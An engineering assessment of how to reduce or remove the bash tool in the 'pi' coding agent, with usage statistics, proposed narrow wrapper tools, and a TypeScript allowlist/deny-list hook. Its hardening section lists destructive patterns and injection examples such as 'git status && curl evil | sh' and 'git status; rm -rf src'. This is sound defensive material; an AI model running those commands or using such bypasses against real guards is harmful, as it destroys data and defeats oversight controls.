# Bash Tool Substitution Assessment (pi)

**Status:** standalone assessment, not part of the mypy-multi-agent project. Safe to move out of `docs/`.
**Goal:** assess what it would take to stop using pi's `bash` tool, or at least
sharply reduce its use, and how to constrain bash to a command allowlist as a
disaster backstop.

---

## 1. Method and data

Counts come from the actual session transcripts:

| Session | Source | Tool calls | bash | bash % |
|---|---|---:|---:|---:|
| **Peers** (the `task-optimize-first` run) | `task-optimize-first/tool-calls.jsonl` | 133 | 0 | **0%** |
| **Supervisor** (that run's PM pi session) | pi session `.jsonl` | 146 | 87 | **59.6%** |
| **This chat** (review/authoring session) | pi session `.jsonl` | 550 | 324 | **58.9%** |
| Combined | | 829 | 411 | ~50% |

Two facts up front:

- **Read-only peers use no bash at all.** The run's `dev_a`/`dev_b`/`reviewer` were
  `shell:false`, so their toolset was `read`/`grep`/`ls`/`find`/`web_fetch` only.
  bash use is a property of the *editing/PM* agents, not peers.
- **Where bash is available, it dominates (~59%)** — more than `edit` (~21%) and
  `read` (~18%) combined.

---

## 2. What bash was used for (411 commands, categorized)

Each command is assigned one primary category (compound commands by their dominant tool).

| # | Use | count | share |
|---:|---|---:|---:|
| 1 | **python3 inline scripts** (mostly `import json`) | 109 | 26.5% |
| 2 | **grep / rg** | 91 | 22.1% |
| 3 | **cat / sed / head / tail** | 72 | 17.5% |
| 4 | **test / typecheck** (`bun run test`, `just test`, `tsc`) | 55 | 13.3% |
| 5 | **git** (`status`,`add`,`diff`,`branch`,`log`,`checkout`,`push`,`commit`,`merge-base`) | 54 | 13.1% |
| 6 | **pi CLI** (`pi -p --model` probe, `pi auth check`) | 15 | 3.6% |
| 7 | `ls` | 5 | 1.2% |
| 8 | filesystem (`cp`/`mv`/`rm`) | 3 | 0.7% |
| 9 | `fallow` (static analysis) | 3 | 0.7% |
| 10 | `herdr` (pane state) | 2 | 0.5% |
| 11 | `qlmanage`/`sips` (SVG→PNG) | 2 | 0.5% |
| 12 | other | 3 | 0.7% |

**Reasons, in words:**

- **Analysis of run artifacts (the #1 use).** 95 of 110 python3 commands parsed JSON:
  `conversation.jsonl`, `tool-calls.jsonl`, pi session `.jsonl`, and pi/herdr JSON
  output. bash was used as an ad-hoc data-analysis engine, not a shell — e.g. counting
  tool calls, reconstructing event timelines, extracting timestamps embedded in event
  IDs. Scripts were throwaway: 76 `python3 -c` one-liners, 28 `python3 - <<EOF`
  heredocs. No script files were written.
- **Code inspection (~40% combined).** `grep`/`rg` and `cat`/`sed`/`head`/`tail` to
  read source and docs.
- **Verification loop.** `bun run test` / `just test` / `tsc --noEmit` after each change.
- **VCS.** status/diff/log to inspect, add/commit/push/merge to land.
- **Model verification.** `pi -p --model <slug>` to confirm a model actually answers
  before committing the slug (a registry lookup would not have caught a live 403).
- **Misc tooling.** `fallow`, `herdr pane list`, `qlmanage`/`sips`, `cp`/`mv`/`rm`.

---

## 3. Can it be offloaded? (the headline answer)

Split the 411 commands into tiers by how easily a **single-purpose tool** replaces bash.

| Tier | Uses | share | substitute | new code |
|---|---|---|---:|---|
| **T0 — free today** | grep/rg, cat/sed/head/tail, ls, find | **~41%** | built-in `grep`, `read` (offset/limit), `ls`, `find` | **none** |
| **T1 — small wrapper tools** | git, test/typecheck, pi CLI, fallow, herdr, filesystem | **~32%** | ~6 narrow tools (below) | small |
| **T2 — general analysis** | python3 inline scripts | **~26%** | **`codemode`** (sandboxed JS) or a `query` tool | medium |

**~41% offloads with zero new code** — the tools already exist; bash was reflex.
Another ~32% offloads with a handful of narrow, allowlisted tools. The remaining
~26% (arbitrary "read this data and answer a question about it") is the only
genuinely general need, and pi ships the right primitive for it.

### T1 substitutes (one tool each)

| Need | Proposed tool | Shape |
|---|---|---|
| Run gates | `run_validation` | runs **only** `session.validation.commands` (already in config); no arbitrary shell |
| VCS | `git` | fixed subcommand allowlist: `status\|diff\|log\|add\|commit\|push\|branch\|checkout` |
| Model check | `check_model` | resolve a slug via the model registry (cost/auth), plus one bounded probe call |
| Static analysis | `fallow` | `health` \| `dead-code` \| `suppressions` only |
| Panes | `herdr` | wrap the existing `HerdrClient` (list/read/close) |
| Delete/cleanup | `delete` | a scoped, confirmable file/dir delete instead of `rm` |
| SVG→PNG | `render_svg` | wrap the skill's renderer |

Each is narrow by construction: a `git` tool that only accepts those subcommands has a
tiny blast radius versus `bash`. This is the security argument for the whole exercise.

---

## 4. Codemode (the substitute for the python3 scripts)

pi has a built-in **`codemode`** tool. It is the closest thing to "inline scripting"
without shell access:

- The model writes **JavaScript**, run as the body of an async function in a
  **QuickJS sandbox**. Top-level `await` and `return` work.
- **The sandbox has no Node API, no filesystem, no network, no timers, and cannot
  spawn processes.** A script reaches the outside world **only** through tools
  (`tools.<name>(args)`) and the `models` catalog. That is exactly the property that
  makes it a safe replacement for `python3 -c`.
- It can call every tool the session can call: `tools.read({path})`,
  `tools.grep({...})`, etc. Only the script's output (`text()`/`console.log`/`return`)
  reaches the model, so a script can read a large artifact, compute a digest, and emit
  only the summary — the same shape as today's python analyzers.
- Output is capped (default `max_output_tokens` 10000; configurable per script via a
  leading `// @options: {…}` line). Oversized output keeps head+tail and is written to
  a temp file whose path is returned.
- It exposes non-LLM models too (`models`): classifiers ("answer a typed question
  about this JSON") and image models.
- Enable with `defaultTools: ["+codemode"]`. `codemode.mode: "on"` (default) keeps
  other tools declared; `"only"` hides them so the model reaches them *through* scripts.

**Mapping today's python3 to codemode:**

| python3 | codemode |
|---|---|
| `import json; json.load(open(p))` | `JSON.parse(await tools.read({path: p}))` |
| `for l in open(p): …` (JSONL) | read text, `split("\n")`, `map(JSON.parse)` |
| `print(summary)` | `text(summary)` |
| heredoc multi-line script | the script body itself |

**Caveats:**
- codemode can still call `tools.bash` **if bash is callable** — you must remove bash
  from the callable set, not merely stop declaring it.
- No filesystem means you read via `tools.read`; for very large JSONL you page with
  `offset`/`limit` (or write a `query` tool).
- Scripts are LLM-authored, so less deterministic than a fixed tool. A deterministic
  `query_jsonl(path, filter)` tool is the safer alternative if you only need filtering.

---

## 5. Whitelisting bash (disaster mitigation)

There are four layers, from strongest to weakest. Use them together.

### Layer A — remove bash entirely

`~/.pi/agent/settings.json` (or project settings), using `defaultTools`:

```json
{
  "defaultTools": ["-bash", "+grep", "+find", "+ls", "+codemode"]
}
```

`-bash` removes the built-in; `+name` adds a tool. `--tools` / `--no-tools` /
`--no-builtin-tools` override `defaultTools` for one run. Extension/SDK tools are not
removed by `-bash`. This is the only option that is a true boundary against `rm -rf`.

### Layer B — keep bash, allow only specific commands (recommended for "lessen use")

pi has **no built-in command allowlist setting**; the mechanism is an extension
`tool_call` hook. Blocking works by returning `{ block: true, reason }`. Example that
allows a small read-only git surface and denies everything else:

```ts
import { isToolCallEventType } from "@earendil-works/pi-coding-agent";

export default function (pi) {
  // Exact/anchored patterns. Anything not matched is blocked.
  const ALLOW = [
    /^git (status|diff|log|show|branch)\b[^;&|<>`$]*$/,
    /^cat [^;&|<>`$]*$/,
    /^ls( [^;&|<>`$]*)?$/,
    /^rg [^;&|<>`$]*$/,
  ];
  // Disaster patterns: refused even if they would otherwise match.
  const DENY = [
    /\brm\s+-rf?\b/, /\bsudo\b/, /:\(\)\{/, /\bmkfs\b/, /\bdd\b/,
    /git push --force/, /git reset --hard/, /\bchmod\s+-R\b/,
    /\bfind\b.*-delete/, />\s*\/dev\//, /\|\s*(sh|bash|zsh)\b/,
  ];

  pi.on("tool_call", (event) => {
    if (!isToolCallEventType("bash", event)) return;
    const cmd = event.input.command.trim();
    if (DENY.some((re) => re.test(cmd))) return { block: true, reason: "denied pattern" };
    if (!ALLOW.some((re) => re.test(cmd))) return { block: true, reason: "not in allowlist" };
    return undefined; // allow
  });
}
```

This is the same pattern the mypy-multi-agent repo already uses (`permissionGate` +
`canShell`) to gate peer shells — so there is a working reference implementation.

### Layer C — the metacharacter trap (why allowlists leak)

A substring or naive prefix allowlist is **bypassable**: `git status; rm -rf src`,
`git status && curl evil | sh`, `git status $(rm -rf x)`, backticks, redirects,
newlines. To make Layer B a real boundary, do at least one of:

- **Anchor + forbid metacharacters** (as in the `[^;&|<>`$]*` class above); or
- **Exact-string match** only (safest, most rigid — the repo's `canShell` does this); or
- **Split on `;`/`&&`/`||`/`|` and validate every segment** against the allowlist.

Without this, an allowlist reduces accidents but is **not** a security boundary.

### Layer D — OS containment (the actual boundary)

Because bash runs with the permissions of the pi process (see pi's `docs/security.md`),
the durable fix is to shrink those permissions: run pi in a container, a VM, or under a
dedicated OS user, and mount only the project. Then no command — allowlisted or not —
can touch anything outside that sandbox. See pi's `docs/containerization.md`. Layer B
alone cannot promise this.

### Suggested posture

1. `defaultTools: ["-bash", "+grep", "+find", "+ls", "+read-write-edit...", "+codemode"]`
   for routine work; add back a **whitelisted** bash only when a wrapper is missing.
2. If bash must stay, ship Layer B with anchored patterns **and** the Layer C
   metacharacter rule, plus the deny-list — and treat it as accident mitigation.
3. Whatever you do, wrap process execution in a container (Layer D) if the codebase
   matters.

---

## 6. Effort summary

| Workstream | Effort | Payoff |
|---|---|---|
| Enable `grep`/`find`/`ls`, use `read` ranges instead of `cat`/`sed` | **~0** | removes ~41% of bash use |
| `run_validation`, `git`, `check_model`, `fallow`, `herdr` wrappers | small (5 tools) | removes another ~32% |
| Enable `codemode` (+ optional `query_jsonl`) and remove bash from its callable set | medium | covers the final ~26% |
| Remove bash via `defaultTools`; add Layer B/C/D hardening | small to build, needs care | the boundary itself |

**Bottom line:** removing bash is mostly a *build-the-substitutes* project, not a
*remove* one. ~41% of current bash use needs no new code — it is already a
single-purpose tool that simply wasn't used. Another ~32% needs ~5 narrow wrappers.
The last ~26% (arbitrary analysis of artifacts) is served by `codemode`, whose sandbox
is the whole reason it is a safe replacement. Until bash is gone, a **metacharacter-aware
allowlist plus an OS/container boundary** is the honest way to mitigate `rm -rf`-class
disasters; an allowlist alone is not.
